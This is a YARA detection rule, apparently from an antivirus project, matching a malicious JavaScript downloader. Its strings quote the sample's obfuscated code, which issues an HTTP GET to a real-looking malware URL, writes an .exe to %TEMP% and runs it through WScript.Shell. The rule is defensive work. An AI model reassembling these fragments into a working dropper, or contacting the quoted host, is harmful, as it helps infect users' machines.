rule sig_20160401_9dd7a0502d2fd2572c0154c46f79d180 {
  meta:
    description = "datamaliciousorder - file 20160401_9dd7a0502d2fd2572c0154c46f79d180.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "f015f77ad7a02a2712c2b5acea2a2ced2643866fe4f17717a1215af841ccace1"

  strings:
    $s1  = "ThBvz[AsiFeq](\"G\" + \"ET\", \"http://xn--as-wqa.org.pl/s0olau\", false);" fullword ascii
    $s2  = "function JuYyo(NvIf, DzbYuo){KfwTw = KfwTw * 1; return NvIf - DzbYuo;};" fullword ascii
    $s3  = "var OvXma = function ZuEol() {return WScript[WmDk](\"WScript\"+\".Shell\");}(), QeIx = 11;" fullword ascii
    $s4  = "if (ThBvz[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function LlHao() {return OvXma[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"yDWLoQ6GqaY.ex\" + \"e\";};" fullword ascii
    $s6  = "function MdHti(){return DkuUyr + \"\";};" fullword ascii
    $s7  = "function RzAw() {return ((QtrPl == true) && (QtrPl == FmKpl)) ? 1 : KfwTw;};" fullword ascii
    $s8  = "function SluIv(MbwYyj){OvXma[\"R\"+\"un\"](MbwYyj, KfwTw, KfwTw);};" fullword ascii
    $s9  = "QtrPl = true; " fullword ascii
    $s10 = "function QcUf(){return 23;};" fullword ascii
    $s11 = "}while (KiiFt);" fullword ascii
    $s12 = "var ZhBnb = false;" fullword ascii
    $s13 = "var FmKpl = false;" fullword ascii
    $s14 = "function FxWhp(NpbOl) {var VfUk = (1, 2, 3, 4, 5, NpbOl); return VfUk;};" fullword ascii
    $s15 = "var QtrPl = false;" fullword ascii
    $s16 = "function BpHfa(){return WmDk;};" fullword ascii
    $s17 = "return JuYyo(EgTt, KwRc);" fullword ascii
    $s18 = "function HaHq()" fullword ascii
    $s19 = "FmKpl = true; " fullword ascii
    $s20 = "var GxrNl = new this[\"Date\"]();" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}